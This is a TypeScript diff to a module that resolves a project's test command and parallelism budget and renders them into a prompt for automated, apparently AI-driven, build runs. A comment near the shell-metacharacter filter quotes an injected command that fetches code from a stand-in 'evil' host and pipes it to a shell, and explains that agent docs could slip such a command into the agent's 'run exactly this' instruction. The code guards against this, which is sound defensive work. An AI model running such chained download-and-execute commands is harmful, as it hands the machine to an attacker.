@@ -23,6 +23,12 @@
  * A throughput optimisation that breaks a project it does not understand is a
  * regression.
  *
+ * THE ONE THING EVERY READER GETS WRONG. The rendered block is FROZEN into a prompt
+ * string at launch and reused for round 1 and every fix round afterwards. So no value
+ * in it may depend on a quantity that changes after launch — which is exactly why the
+ * jobs budget divides by a CONSTANT fan-out and not by the live run count. See
+ * `computeTestJobs`.
+ *
  * CONTRACT OF THIS MODULE: pure-ish (reads files, writes nothing), NEVER throws into
  * a launch path, NEVER spawns a process anywhere, and has NO import-time side
  * effects. A build must never fail because the strategy could not be derived.
@@ -60,6 +66,38 @@ const AGENT_DOC_FILES = ['CLAUDE.md', 'AGENTS.md', 'CONTRIBUTING.md'] as const
 const TEST_INVOCATION =
   /^(?:\$\s*)?((?:bash|sh)\s+\S+\.sh|bun\s+test\b.*|(?:npm|pnpm|yarn)\s+(?:run\s+)?test\b.*|pytest\b.*|go\s+test\b.*|cargo\s+test\b.*)$/
 
+/**
+ * The other half of the closed list. Every alternative above ends in `.*` so that a
+ * real invocation's flags survive (`bun test --bail`, `pytest -q tests/`), and `.*`
+ * on its own would happily carry `bun test ; curl http://evil/x | sh` — a recognised
+ * PREFIX followed by arbitrary shell, rendered to the build under "run exactly this".
+ * A recognised prefix is not a recognised command, so anything that could chain,
+ * substitute or redirect disqualifies the whole line and we fall through to the next
+ * candidate (and ultimately to the honest "unresolved" branch).
+ *
+ * Applies to AGENT DOCS ONLY. `package.json` `scripts.test` is the project's own
+ * declared entry point, where `tsc && bun test` is both normal and correct.
+ */
+const SHELL_METACHARACTERS = /[;&|`$(){}<>\\\n]|\|\|/
+
+function hasShellMetacharacters(command: string): boolean {
+  return SHELL_METACHARACTERS.test(command)
+}
+
+/**
+ * `npm init` writes `"test": "echo \"Error: no test specified\" && exit 1"` and most
+ * repos never delete it. Splicing that verbatim under "Full suite (stage 2), run
+ * exactly this" hands the build a guaranteed-red command it is then told to iterate
+ * until green — a project with no tests must still BUILD (PART 2 §3), so the
+ * placeholder is treated as "no test script declared" and falls through to the agent
+ * docs, then to the honest unresolved branch.
+ */
+const PLACEHOLDER_TEST_SCRIPT = /no test specified/i
+
+function isPlaceholderTestScript(script: string): boolean {
+  return PLACEHOLDER_TEST_SCRIPT.test(script)
+}
+
 function readTextOrNull(path: string, maxBytes = 1024 * 1024): string | null {
   try {
     const stat = statSync(path)
@@ -83,7 +121,7 @@ export function resolveTestCommand(repoRoot: string): TestCommandResolution {
       try {
         const pkg = JSON.parse(pkgText) as { scripts?: { test?: unknown } }
         const declared = pkg?.scripts?.test
-        if (typeof declared === 'string' && declared.trim().length > 0) {
+        if (typeof declared === 'string' && declared.trim().length > 0 && !isPlaceholderTestScript(declared)) {
           return { command: declared.trim(), source: 'package-json' }
         }
       } catch {
@@ -115,7 +153,8 @@ function firstFencedTestInvocation(markdown: string): string | null {
     }
     if (!inFence) continue
     const match = TEST_INVOCATION.exec(line)
-    if (match) return match[1].trim()
+    const candidate = match?.[1]?.trim()
+    if (candidate !== undefined && candidate.length > 0 && !hasShellMetacharacters(candidate)) return candidate
   }
   return null
 }
@@ -127,13 +166,29 @@ function firstFencedTestInvocation(markdown: string): string | null {
 export interface ParallelKnobs {
   /** `'NEUTRON_TEST_JOBS'` when the runner is known to honour it, else null. */
   jobs_env: string | null
+  /** `'NEUTRON_TEST_CONCURRENCY'` when the runner is known to honour it, else null. */
+  concurrency_env: string | null
   /** Repo-relative (or absolute) script file whose text was scanned, or null. */
   probed_file: string | null
+  /**
+   * The COMMAND STRING itself already assigns one of the knobs — the project has
+   * PINNED it (`"test": "NEUTRON_TEST_JOBS=1 bash scripts/run-tests.sh"`). Prefixing
+   * our own assignment in front of that is silently discarded: in `A=1 A=2 cmd` the
+   * LAST assignment wins, so the budget would evaporate while the block claimed to
+   * have set it. A pinned knob is reported honestly and left alone.
+   */
+  pinned_by_command: boolean
 }
 
-const NO_KNOBS: ParallelKnobs = { jobs_env: null, probed_file: null }
+const NO_KNOBS: ParallelKnobs = {
+  jobs_env: null,
+  concurrency_env: null,
+  probed_file: null,
+  pinned_by_command: false,
+}
 
 const JOBS_ENV = 'NEUTRON_TEST_JOBS'
+const CONCURRENCY_ENV = 'NEUTRON_TEST_CONCURRENCY'
 
 /**
  * JUDGMENT CALL, deliberate: this probe is a STATIC TEXT SCAN and nothing else. The
@@ -147,11 +202,14 @@ const JOBS_ENV = 'NEUTRON_TEST_JOBS'
  * Scanned: (a) the command string; (b) the first whitespace token ending in
  * `.sh|.mjs|.js|.ts` that resolves (relative to `repoRoot`, or absolute) to an
  * existing file ≤ 1 MiB.
+ *
+ * An assignment of either knob INSIDE the command string is not "support", it is a
+ * PIN: the project chose that value, and a prefix in front of it loses to it anyway.
+ * That case reports `pinned_by_command` and no usable knob.
  */
 export function probeParallelKnobs(repoRoot: string, command: string | null): ParallelKnobs {
   try {
     if (typeof command !== 'string' || command.trim().length === 0) return NO_KNOBS
-    const jobsPattern = new RegExp(`\\b${JOBS_ENV}\\b`)
 
     let probed_file: string | null = null
     let scriptText: string | null = null
@@ -165,11 +223,28 @@ export function probeParallelKnobs(repoRoot: string, command: string | null): Pa
       break
     }
 
-    const found = jobsPattern.test(command) || (scriptText !== null && jobsPattern.test(scriptText))
-    return { jobs_env: found ? JOBS_ENV : null, probed_file }
+    const pinned_by_command = assignsEnv(command, JOBS_ENV) || assignsEnv(command, CONCURRENCY_ENV)
+    if (pinned_by_command) return { jobs_env: null, concurrency_env: null, probed_file, pinned_by_command }
+
+    return {
+      jobs_env: honours(command, scriptText, JOBS_ENV) ? JOBS_ENV : null,
+      concurrency_env: honours(command, scriptText, CONCURRENCY_ENV) ? CONCURRENCY_ENV : null,
+      probed_file,
+      pinned_by_command,
+    }
   } catch {
     return NO_KNOBS
   }
+}
+
+/** `NAME=` anywhere in the command string — an env assignment the project made itself. */
+function assignsEnv(command: string, name: string): boolean {
+  return new RegExp(`\\b${name}\\s*=`).test(command)
+}
+
+function honours(command: string, scriptText: string | null, name: string): boolean {
+  const pattern = new RegExp(`\\b${name}\\b`)
+  return pattern.test(command) || (scriptText !== null && pattern.test(scriptText))
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -178,44 +253,95 @@ export function probeParallelKnobs(repoRoot: string, command: string | null): Pa
 
 export interface TestJobsInput {
   cores: number
-  /** Non-terminal trident runs, INCLUDING this one — the live fan-out. */
+  /** Runs ACTUALLY IN A BUILD PHASE, including this one — the live test-running fan-out. */
   active_runs: number
   mem_available_bytes: number
   /** The runner's `NEUTRON_TEST_CHUNK_SIZE` default. */
   chunk_size?: number
-  /** Conservative per-file working set, per `docs/testing-runner.md`'s RSS model. */
+  /** Conservative per-file working set. See `DEFAULT_PER_FILE_RSS`. */
   per_file_rss_bytes?: number
+  /** The planned box-wide fan-out. See `DEFAULT_BUILD_FANOUT`. */
+  fanout?: number
 }
 
 const DEFAULT_CHUNK_SIZE = 100
+/**
+ * A deliberately CONSERVATIVE per-file working set. `docs/testing-runner.md` measures
+ * ~1 MiB/file for the discovery+module graph and documents that a single process
+ * passes ~1.2 GB RSS on the whole suite; this constant is not that measurement, it is
+ * a 24× safety factor over it so the RAM term errs toward fewer jobs. On the reference
+ * box the term is INERT (25 GiB × 0.8 ÷ (100 × 24 MiB) = 8, equal to the core term):
+ * it binds only on a small or heavily-loaded box, which is exactly when it should.
+ */
 const DEFAULT_PER_FILE_RSS = 24 * 2 ** 20 // 24 MiB
 /** Leave a fifth of available RAM for everything else on a shared box. */
 const MEM_HEADROOM = 0.8
 
 /**
- * Split the box across the runs that are actually in flight, then cap by RAM.
+ * THE DIVISOR IS A CONSTANT, NOT THE LIVE COUNT — and that is the whole point.
  *
- * Why divide at all: trident fans several builds out at once, and four concurrent
- * builds each asking for `JOBS=4` is sixteen bun processes on eight cores — slower
- * than sequential, and a plausible OOM.
+ * The obvious design (divide the cores by however many runs are live RIGHT NOW) is
+ * wrong here, and was shipped wrong in the first round of this change: the value is
+ * rendered into a PROMPT STRING at launch and then frozen for the whole run, round 1
+ * and every fix round. Runs do not launch simultaneously. Run 1 launches alone, sees
+ * 1, and keeps `JOBS = cores` for the next hour; run 2 launches, sees 2, takes
+ * `cores/2`; run 3 takes `cores/3`. The aggregate on an 8-core box is 8+4+2 = 14 chunk
+ * processes, worse than the oversubscription the division existed to prevent.
  *
- * Reference box (8 cores, 25 GiB available, defaults → memory allows 8):
+ * A constant divisor is stale-proof BY CONSTRUCTION: every run — whenever it launched,
+ * and however long its string has been frozen — asks for `cores / FANOUT`, so as long
+ * as at most FANOUT builds are in flight the sum is at most `cores`. The live count is
+ * kept only as a RAISE-ONLY term (`max(fanout, active_runs)`): beyond FANOUT builds
+ * the later launches shrink further, which is a degradation and not a guarantee — with
+ * more than FANOUT concurrent builds the earlier frozen grants DO oversubscribe, and
+ * saying so is the honest statement of what this arithmetic buys.
  *
- *   active_runs │ 1 │ 2 │ 4 │ 8+ │
- *   jobs        │ 8 │ 4 │ 2 │  1 │
+ * 4 is the card's own worked example ("four concurrent builds each asking for JOBS=4
+ * is sixteen bun processes on eight cores") and matches the observed trident fan-out.
+ */
+export const DEFAULT_BUILD_FANOUT = 4
+
+/**
+ * Split the box across the PLANNED fan-out, then cap by RAM.
  *
+ * Reference box (8 cores, 25 GiB available, defaults → the memory term allows 8):
+ *
+ *   divisor = max(FANOUT, active_runs) │ 1 │ 2 │ 4 │ 8+ │
+ *   jobs                               │ 8 │ 4 │ 2 │  1 │
+ *
+ * With the shipped `FANOUT = 4` the divisor is never below 4, so this box budgets
+ * `JOBS=2` per build and 4 concurrent builds total 8 chunk processes on 8 cores.
  * (These numbers go verbatim into AS_BUILT.) Any unusable input degrades to 1 —
  * sequential, i.e. exactly the runner's own default, which is always safe.
  */
 export function computeTestJobs(input: TestJobsInput): number {
   const chunkSize = positiveOr(input.chunk_size, DEFAULT_CHUNK_SIZE)
   const perFileRss = positiveOr(input.per_file_rss_bytes, DEFAULT_PER_FILE_RSS)
+  const fanout = positiveOr(input.fanout, DEFAULT_BUILD_FANOUT)
   if (!isPositive(input.cores) || !isPositive(input.mem_available_bytes)) return 1
-  if (!isPositive(input.active_runs)) return 1
 
-  const byCores = Math.max(1, Math.floor(input.cores / Math.max(1, input.active_runs)))
+  const divisor = Math.max(1, Math.floor(Math.max(fanout, isPositive(input.active_runs) ? input.active_runs : 1)))
+  const byCores = Math.max(1, Math.floor(input.cores / divisor))
   const byMem = Math.max(1, Math.floor((input.mem_available_bytes * MEM_HEADROOM) / (chunkSize * perFileRss)))
   return Math.min(byCores, byMem)
+}
+
+/**
+ * The in-process interleaving budget that goes with `jobs`.
+ *
+ * The runner's `NEUTRON_TEST_CONCURRENCY` default is the box's PHYSICAL CORE COUNT,
+ * chosen for the sequential default where there is exactly one chunk process. Raising
+ * `JOBS` without touching it multiplies: the first measured parallel run of this card
+ * was `jobs=8 max-concurrency=8` — 64 test files interleaving on 8 cores — and it
+ * showed up as +28% summed process time (1311 s → 1673 s) against a 1.97× wall-clock
+ * win. So the two are budgeted TOGETHER: `cores / jobs`, i.e. this build's chunk
+ * processes get one core's worth of interleaving each, and `jobs × concurrency` is
+ * `cores` per build instead of `cores²`. `jobs = 1` reproduces the runner's own
+ * default exactly, so a knob-less or sequential path is unchanged.
+ */
+export function computeTestConcurrency(cores: number, jobs: number): number {
+  if (!isPositive(cores) || !isPositive(jobs)) return 1
+  return Math.max(1, Math.floor(cores / Math.floor(jobs)))
 }
 
 export interface HostBudget {
@@ -297,6 +423,8 @@ export interface TestStrategyInput {
   resolution: TestCommandResolution
   knobs: ParallelKnobs
   jobs: number
+  /** The in-process interleaving budget that goes with `jobs`. Absent → not set. */
+  concurrency?: number
   base_branch: string
 }
 
@@ -306,6 +434,17 @@ export interface TestStrategyInput {
  * the honest-degradation proof point for PART 2 (enterprise).
  */
 export const NO_KNOBS_LINE = 'parallel knobs not found in the project test runner — running it unchanged (sequential)'
+
+/**
+ * The project assigns the knob itself, so we leave it alone. Also a LOG LINE, not an
+ * error, and for the same reason: a prefixed assignment would lose to the project's own
+ * and the block would be CLAIMING a budget it did not set.
+ */
+export const PINNED_KNOBS_LINE =
+  'the project pins its own parallelism in the test command — running it unchanged, budget not applied'
+
+/** Stage 1 must never grow into an un-chunked whole-suite run. See `renderTestStrategy`. */
+export const STAGE_1_FILE_CAP = 40
 
 /** Stage 1 exists to REJECT early. Pinned verbatim: this is the defect guard. */
 export const STAGE_1_REJECT_ONLY = 'Stage 1 can only reject early; it can never approve.'
@@ -324,6 +463,7 @@ export function renderTestStrategy(input: TestStrategyInput): string {
   const hasKnob = command !== null && typeof knobs?.jobs_env === 'string' && knobs.jobs_env.length > 0
   const baseBranch = typeof base_branch === 'string' && base_branch.trim().length > 0 ? base_branch.trim() : 'main'
   const jobCount = isPositive(jobs) ? Math.floor(jobs) : 1
+  const concurrency = isPositive(input.concurrency) ? Math.floor(input.concurrency) : null
 
   const commandLines: string[] = []
   if (command === null) {
@@ -335,16 +475,27 @@ export function renderTestStrategy(input: TestStrategyInput): string {
       NO_KNOBS_LINE,
     )
   } else if (hasKnob) {
+    // EXPORTS ON THEIR OWN LINES, NOT A `VAR=v cmd` PREFIX. A one-command prefix reaches
+    // only the FIRST command of a compound test script (`tsc && bun test` — verified: the
+    // second command sees nothing), and the knob would be silently discarded on exactly
+    // the projects whose scripts.test does more than one thing.
     commandLines.push(
-      'Full suite (stage 2), run exactly this:',
+      'Full suite (stage 2), run exactly this — the export lines FIRST, on their own lines, so a',
+      'compound test command inherits them:',
       '',
-      `  ${knobs.jobs_env}=${jobCount} ${command}`,
+      `  export ${knobs.jobs_env}=${jobCount}`,
+      ...(concurrency !== null && typeof knobs.concurrency_env === 'string'
+        ? [`  export ${knobs.concurrency_env}=${concurrency}`]
+        : []),
+      `  ${command}`,
       '',
       `The runner honours ${knobs.jobs_env} (found by static scan${knobs.probed_file ? ` of ${knobs.probed_file}` : ''}). The value`,
-      'above is this box’s core/RAM budget divided across the trident runs currently in flight —',
-      'do NOT raise it; other builds are sharing these cores. Everything else about the command',
-      'stays as the project wrote it.',
+      "above is this box's core/RAM budget divided across trident's planned build fan-out — do NOT",
+      'raise it; other builds are sharing these cores. Everything else about the command stays as',
+      'the project wrote it.',
     )
+  } else if (knobs?.pinned_by_command === true) {
+    commandLines.push('Full suite (stage 2), run exactly this:', '', `  ${command}`, '', PINNED_KNOBS_LINE)
   } else {
     commandLines.push(
       'Full suite (stage 2), run exactly this:',
@@ -361,12 +512,32 @@ export function renderTestStrategy(input: TestStrategyInput): string {
     ...commandLines,
     '',
     'STAGE 1 — fail fast (minutes, not tens of minutes).',
-    `After your edits, list what you changed: \`git diff --name-only ${baseBranch}..HEAD\`. The stage-1`,
-    'set is: (a) the changed files that are themselves test files, (b) the test files in each',
-    "changed file's own directory or its adjacent `__tests__/`, and (c) test files that name a",
-    "changed module's basename (`grep -l <basename> <test files>`). Run ONLY that set, using the",
-    "project's file-scoped test invocation (e.g. `bun test <file> …`). A stage-1 failure is fixed",
-    `IMMEDIATELY, before anything else — do not start the full suite on a red stage 1. ${STAGE_1_REJECT_ONLY}`,
+    // THE DIFF RANGE IS base..WORKING TREE, NOT base..HEAD. Step 3 runs the tests and
+    // step 4 commits, so at stage-1 time there is usually NOTHING committed yet and
+    // `base..HEAD` prints an empty list (on a fix round it prints the PREVIOUS round's
+    // files, which is worse than empty). `git diff --name-only <base>` compares the base
+    // against the WORKING TREE; the second command catches files git has never seen.
+    `After your edits, list what you changed — WORKING TREE included, because you have not`,
+    `committed yet: \`git diff --name-only ${baseBranch}\` plus \`git ls-files --others --exclude-standard\`.`,
+    'The stage-1 set is: (a) the changed files that are themselves test files, (b) the test files',
+    "in each changed file's own directory or its adjacent `__tests__/`, and (c) test files that",
+    "name a changed module's basename (`grep -l <basename> <test files>`).",
+    // THE CAP IS THE POINT, not politeness. Tier (c) on a generic basename ("index",
+    // "store", "utils") matches hundreds of files in a large repo, and a file-scoped
+    // invocation is ONE un-chunked process — reproducing exactly the single-process OOM
+    // and the cross-file lane contamination the project's own chunked runner exists to
+    // prevent. Stage 1 is a fast REJECT, so it is allowed to be incomplete; stage 2 is
+    // the authority, and it runs everything.
+    `Bound that set: keep tiers (a)+(b) always, and take tier (c) only while the total stays at or`,
+    `below ${STAGE_1_FILE_CAP} files — if (c) would blow that budget, DROP (c) entirely rather than`,
+    'trimming it, and run the files in batches of at most 20 per invocation. Stage 1 is a fast',
+    'reject and is ALLOWED to be incomplete.',
+    "Run that set with the project's file-scoped test invocation (e.g. `bun test <file> …`). A",
+    'stage-1 failure is fixed IMMEDIATELY, before anything else — do not start the full suite on a',
+    `red stage 1. ${STAGE_1_REJECT_ONLY}`,
+    'A file-scoped run does NOT reproduce the isolation lanes the project runner sets up, so a',
+    'stage-1 red your own diff cannot explain is NOT chased here — leave it to stage 2, which runs',
+    'the suite the way the project intends.',
     '',
     'STAGE 2 — the full suite, REQUIRED.',
     `${FULL_SUITE_REQUIRED}`,
@@ -402,7 +573,8 @@ export function buildTestStrategy(
       active_runs: env?.active_runs,
       mem_available_bytes: env?.mem_available_bytes,
     })
-    return renderTestStrategy({ resolution, knobs, jobs, base_branch: env?.base_branch })
+    const concurrency = computeTestConcurrency(env?.cores, jobs)
+    return renderTestStrategy({ resolution, knobs, jobs, concurrency, base_branch: env?.base_branch })
   } catch {
     return renderTestStrategy({
       resolution: UNRESOLVED,
